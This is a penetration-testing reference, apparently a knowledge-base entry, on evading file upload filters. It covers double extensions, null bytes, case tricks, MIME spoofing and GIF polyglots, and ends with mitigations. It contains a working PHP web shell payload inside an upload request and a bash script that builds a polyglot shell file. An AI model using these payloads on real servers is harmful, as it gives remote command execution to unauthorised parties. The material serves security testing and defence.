# File Upload Bypass Techniques

## Overview
- Purpose: Bypass file upload validation and filtering mechanisms to upload malicious files
- Category: web_security
- Severity: high
- Tags: file-upload, bypass, validation-evasion, security-testing, OWASP-A4

## Context and Use-Cases
- Applications implement various validation mechanisms to prevent malicious file uploads
- Attackers use multiple bypass techniques to circumvent these protections
- Security testers need to understand these techniques to identify weak implementations
- Common in penetration testing and bug bounty programs

## Bypass Techniques

### 1. Double Extension
**Technique:** `double_extension`

Upload files with multiple extensions where the server processes the first extension but the application only validates the last one.

**Example:**
```
shell.php.txt
```
- Server may execute as PHP if configured to process `.php` files
- Validation logic only checks for `.txt` extension

**Variations:**
- `shell.txt.php` - Reverse order
- `shell.php.jpg` - Image extension as secondary

### 2. Null Byte Injection
**Technique:** `null_byte`

Insert null byte (`%00`) to truncate filename during processing.

**Example:**
```
shell.php%00.txt
```
- Filename becomes `shell.php` after null byte truncation
- Validation sees `.txt`, but server processes as `.php`

**Note:** Primarily effective on older systems; modern frameworks handle this better.

### 3. Case Variation
**Technique:** `case_variation`

Exploit case-insensitive extension checking.

**Examples:**
```
shell.PhP
shell.pHP
shell.PHP
shell.pHp
```
- Validation logic may check for lowercase `.php`
- Server still executes uppercase variants

### 4. Trailing Characters
**Technique:** `trailing_dot`

Add trailing dots or spaces to filename.

**Examples:**
```
shell.php.
shell.php::$DATA (NTFS alternate data stream)
shell.php%20 (space)
```
- Some systems strip trailing characters
- Results in executable file with original extension

### 5. Content-Type Spoofing
**Technique:** `content_type_spoofing`

Modify HTTP Content-Type header to bypass MIME type validation.

**Example:**
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----

------
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------
```
- Server validates Content-Type header instead of file content
- Actual file is PHP but claims to be JPEG

### 6. Magic Bytes Manipulation
**Technique:** `magic_bytes`

Prepend file magic bytes (file signature) to bypass content validation.

**Example - Image Polyglot:**
```
GIF89a<?php system($_GET['cmd']); ?>
```
- File starts with GIF89a (GIF header)
- Followed by PHP code
- Passes GIF validation but executes as PHP

**Other Magic Bytes:**
- JPEG: `FF D8 FF E0`
- PNG: `89 50 4E 47`
- PDF: `25 50 44 46`

### 7. Special Characters and Encoding
**Technique:** `special_characters`

Use special characters, unicode, or encoding tricks.

**Examples:**
```
shell.php%20 (URL encoded space)
shell.php%00 (URL encoded null)
shell.php::$DATA (NTFS ADS)
shell.php........ (multiple dots)
shell.php;.jpg (semicolon separator)
```

## Examples

### Testing Bypass Techniques
```python
bypass_techniques = [
    "double_extension",      # shell.php.txt
    "null_byte",            # shell.php%00.txt
    "content_type_spoofing", # Claim as image/jpeg
    "magic_bytes",          # GIF89a + PHP code
    "case_variation",       # shell.PhP
    "special_characters"    # shell.php. or shell.php%20
]

# For each technique, generate test file and attempt upload
for technique in bypass_techniques:
    test_file = generate_bypass_file(technique)
    response = upload_file(test_file)
    verify_execution(response)
```

### Polyglot File Creation
```bash
# Create GIF with embedded PHP
printf '\x47\x49\x46\x38\x39\x61' > polyglot.gif  # GIF89a header
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.gif

# Upload as image, execute as PHP
```

## Detection and Mitigation
- Validate file content (magic bytes), not just extension or MIME type
- Use strict whitelist of allowed extensions
- Store uploads outside web root with no execute permissions
- Rename files to remove original extension
- Implement proper access controls on upload directory
- Use dedicated file storage service (S3, Azure Blob)
- Scan uploaded files with antivirus/malware detection
- Log and monitor upload activities
